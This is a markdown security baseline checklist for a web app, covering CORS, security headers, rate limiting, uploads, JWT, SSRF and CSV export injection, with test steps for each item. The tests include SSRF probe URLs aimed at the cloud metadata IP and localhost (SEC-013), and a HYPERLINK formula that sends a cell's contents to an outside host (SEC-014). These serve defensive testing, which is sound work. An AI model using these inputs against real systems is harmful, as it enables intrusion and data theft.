# Security baseline

- [ ] `SEC-001` **P0** Secrets only in env / secret manager
- [ ] `SEC-002` **P0** Passwords hashed with bcrypt / argon2 (never plain, never MD5/SHA1), and no plaintext copy beside the hash: no `PlainPassword` or `TempPassword` column kept so an admin can show it again, no password in logs or activity entries, no copy or BCC of e-mails that contain one. Test: `grep -rniE "plain.?password|password.?plain|temp.?password"` in code and schema, and list every e-mail template that contains a password with all its recipients
- [ ] `SEC-003` **P0** Auth + authorization on every protected route
- [ ] `SEC-004` **P0** Parameterized queries
- [ ] `SEC-005` **P0** CORS restricted to known origins. The list holds every hostname that serves the site: when both `www` and the bare domain answer (no server-side 301 from one to the other), both are on it, or forms fail for everyone on the missing one. Test: send a cross-origin request with `Origin: https://example.org` (refused), then submit a form from `www` and from the bare domain
- [ ] `SEC-006` **P1** Security headers: `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`, `Cross-Origin-Opener-Policy: same-origin`. Pages that open a sign-in or payment popup that reports back to the page (Google Identity Services and others) use `same-origin-allow-popups` instead: `same-origin` cuts the popup's link to the page and login never completes (see `AUTH-017`). The CSP actually stops XSS: scripts allowed by nonce or hash, no `unsafe-inline` or `unsafe-eval` for scripts, and it lists each sign-in and payment provider's script, frame, connect and style hosts. Test: PageSpeed Insights doesn't flag "Ensure CSP is effective against XSS attacks" or COOP (it accepts both values); securityheaders.com; after every COOP or CSP change, sign in with each provider and run a test payment
- [ ] `SEC-007` **P1** Rate limiting on login, signup, reset, OTP, AI endpoints and every public form that sends e-mail or SMS, keyed on the real client IP: the framework's forwarded-headers support trusts only your proxy's hop (never the leftmost `X-Forwarded-For`). Login and code checks also count per account, so guessing from many IPs is slowed too, and no lock lasts until an admin unlocks it (otherwise anyone can lock a user out by typing their name). IPv6 clients are keyed by their /64 and IPv4-mapped addresses as IPv4. A global cap on a public form sits well above the per-IP cap, so one client can't close it for everyone. When your own server calls the API (SSR, a BFF, server actions), it forwards the visitor's IP in a header the API trusts only from that server's address, and the server's own calls get a separate bucket; streaming and media endpoints key on IP plus the signed-in user, because whole offices and mobile carriers share one IP. Test: send attempts with a new fake `X-Forwarded-For` each time, and from two networks; send 20 wrong passwords for one account, each from a new IP, then log in as that user with the right one; load 50 pages quickly through the website and look for 429s in the API log
- [ ] `SEC-008` **P1** File uploads: type + size check, stored outside web root, no executable files. Served only through an authorized endpoint or signed URL (not a static `/uploads` mapping); only raster images inline, everything else as a download with `nosniff`; path checks run on the resolved path. This covers files that arrive through a webhook or messaging channel (chat documents, e-mail attachments) and are opened later in an admin or support panel: their MIME type is whatever the sender declared, so the file endpoint also sends `Content-Security-Policy: default-src 'none'; sandbox`. Images are decoded with only the accepted formats enabled and refused above a pixel cap read before decoding (sharp `limitInputPixels`, Pillow `MAX_IMAGE_PIXELS`). Limits in front of the API (proxy, server action, IIS) match the API's; files live in object storage or a backed-up volume, not the app server's disk. Test: upload several photos straight from an iPhone and an Android phone plus the largest allowed file on production, redeploy, then open them logged out and as another tenant; send an `.html` file and an `.svg` containing `<script>` through each channel and open them from the panel: they download instead of rendering
- [ ] `SEC-009` **P1** JWT: short expiry, refresh flow, secret is long and random. The refresh cookie lives as long as the refresh token (not the access token); rotation has a short reuse grace window and the client refreshes single-flight; mutable state (workspace, role, plan) isn't frozen in the token. Only a confirmed 401 from your API logs the user out: not a wrong OTP on the login screen, a background call by an anonymous visitor, or a network error at cold start. Test: wait past access expiry and load a page firing several calls in two tabs; open the app offline
- [ ] `SEC-010` **P1** Dependency audit clean of critical vulnerabilities. An advisory you accept is suppressed by its advisory ID or URL (`NuGetAuditSuppress`, the audit tool's ignore list) with a comment giving the date to revisit it, never by turning the audit off. With `-warnaserror` or `TreatWarningsAsErrors`, NuGet audit warnings (`NU1901`–`NU1904`) fail every build the day a new advisory is published, so decide before that day which builds the audit may block (list those codes in `WarningsNotAsErrors` for pull-request builds and let a scheduled audit job fail instead)
- [ ] `SEC-011` **P2** 2FA for admin accounts
- [ ] `SEC-012` **P0** Codes, tokens, keys and passwords come from a CSPRNG (`RandomNumberGenerator`, `crypto.randomBytes` / `randomInt`, `secrets`), never `Math.random` / `System.Random` / `random.randint` / `Get-Random`, and no token is derived from a user ID. Test: `grep -rnE "new Random\(|System\.Random|Math\.random|Get-Random|random\.randint"` and check every hit that produces a code, token, key, password or salt, including setup and deploy scripts
- [ ] `SEC-013` **P0** Server-side fetches of user-supplied URLs ("import from URL", link previews, webhooks) refuse internal, metadata (`169.254.169.254`) and private IPv4/IPv6 targets at connect time, including after redirects and DNS rebinding, and stop reading at a size cap. Test: submit `http://169.254.169.254/`, `http://localhost:<port>/`, `http://[::1]/`, `http://[fd00::1]/` and a URL that redirects to `127.0.0.1`
- [ ] `SEC-014` **P1** CSV / Excel exports neutralize cells starting with `= + - @` (prefix `'` or typed string cells). Test: put `=HYPERLINK("https://example.com?x="&A1,"x")` into a field that reaches an export and open the file in Excel or LibreOffice: the cell shows the literal text
- [ ] `SEC-015` **P1** The business owner can sign in alone, from a new device, to every production account (domain, e-mail, store consoles, payment panel, cloud, analytics); two-factor recovery doesn't depend on one person's phone; passwords are shared through a password manager, never in chat or e-mail, and any that were get changed (see `CLOUD-011`, `UNI-001`)
